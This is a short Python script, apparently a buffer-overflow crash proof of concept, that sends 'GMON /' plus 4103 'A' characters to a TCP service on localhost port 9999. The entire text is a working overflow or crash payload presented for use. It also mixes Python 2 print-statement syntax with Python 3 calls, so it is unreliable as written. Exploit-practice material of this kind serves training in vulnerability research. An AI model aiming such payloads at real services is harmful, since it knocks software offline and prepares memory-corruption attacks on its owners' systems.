import socket
import os
import sys

payload = ""
payload += "GMON /"     # Crash Command
payload += "A" * 4103   # Crash Length

print "[+] Sending buffer (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
print(s.recv(1024))
s.send(payload.encode('utf-8'))
s.close()  
